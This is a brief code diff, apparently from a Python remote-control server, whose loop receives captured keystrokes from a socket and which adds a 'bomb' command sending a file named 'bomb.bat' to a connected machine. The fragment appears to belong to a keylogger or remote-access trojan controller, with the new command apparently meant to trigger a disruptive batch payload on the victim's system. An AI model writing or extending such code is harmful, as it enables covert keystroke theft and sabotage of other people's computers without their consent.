@@ -119,8 +119,13 @@ while 1 :
       speskeys = s.recv(5000)
       print(alphpressedkeys)
       print(speskeys)
+
       
-      
+  
+  elif command == "bomb":
+    conn.send(command.encode())
+    bomb = (str("bomb.bat"))
+    conn.send(bomb.encode())
       
       
       
